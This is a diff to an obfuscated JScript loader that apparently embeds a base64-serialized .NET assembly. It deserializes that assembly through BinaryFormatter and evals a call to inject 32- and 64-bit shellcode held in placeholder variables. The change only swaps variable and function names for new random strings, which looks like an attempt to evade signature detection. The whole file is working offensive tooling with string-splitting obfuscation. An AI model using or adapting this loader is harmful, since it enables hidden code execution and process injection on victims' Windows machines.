@@ -1,6 +1,6 @@
-var safdsv64 = "#REPLACEME64#";
-var safdsv32 = "#REPLACEME32#";
-var foi4qj3sakdf = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
+var sqjidcjs3fafdsv64 = "#REPLACEME64#"; 
+var sqjidcjs3fafdsv32 = "#REPLACEME32#"; 
+var pdkkkdpaln = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+ 
 "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
 "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
 "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
@@ -125,7 +125,7 @@ var foi4qj3sakdf = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxp
 "UmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkGHAAAAC5TeXN0ZW0uUmVmbGVjdGlvbi5B"+
 "c3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10pCAAAAAoL";
 function dbg(s) {WScript.Echo(s);}
-function OdjBsjjjd(b) {
+function aFWvvfgvfbgfjjd(b) {
 	new ActiveXObject('W'+'s'+'c'+'r'+'i'+'p'+'t.S'+'h'+'e'+'l'+'l').Environment('P'+'r'+'o'+'c'+'e'+'s'+'s')('C'+'O'+'M'+'P'+'L'+'U'+'S'+'_'+'V'+'e'+'r'+'s'+'i'+'o'+'n') = 'v'+'4'+'.'+'0'+'.'+'3'+'0'+'3'+'1'+'9';
 	var enc = new ActiveXObject("S"+"y"+"s"+"t"+"e"+"m.T"+"e"+"x"+"t.A"+"S"+"C"+"I"+"I"+"E"+"n"+"c"+"o"+"d"+"i"+"n"+"g");
 	var length = enc.GetByteCount_2(b);
@@ -138,7 +138,7 @@ function OdjBsjjjd(b) {
 	return ms;
 }
 try {
-	var stm = OdjBsjjjd(foi4qj3sakdf);
+	var stm = aFWvvfgvfbgfjjd(pdkkkdpaln);
 	var fmt = new ActiveXObject('S'+'y'+'s'+'t'+'e'+'m.R'+'u'+'n'+'t'+'i'+'m'+'e.S'+'e'+'r'+'i'+'a'+'l'+'i'+'z'+'a'+'t'+'i'+'o'+'n.F'+'o'+'r'+'m'+'a'+'t'+'t'+'e'+'r'+'s.B'+'i'+'n'+'a'+'r'+'y.B'+'i'+'n'+'a'+'r'+'y'+'F'+'o'+'r'+'m'+'a'+'t'+'t'+'e'+'r');
 	var al = new ActiveXObject('S'+'y'+'s'+'t'+'e'+'m.C'+'o'+'l'+'l'+'e'+'c'+'t'+'i'+'o'+'n'+'s.A'+'r'+'r'+'a'+'y'+'L'+'i'+'s'+'t');
 	var n = fmt.SurrogateSelector;
@@ -149,7 +149,7 @@ try {
 	var z=".Create";
 	var xx="Instance('D'+'o'+'t'+'N'+'e'+";
 	var yy="'t'+'2'+'J'+'S');o.inj";
-	var zz="ect(safdsv32,safdsv64);";
+	var zz="ect(sqjidcjs3fafdsv32,sqjidcjs3fafdsv64);"; 
 	eval(x+y+z+xx+yy+zz);
 } catch (e) {
     dbg(e.message);
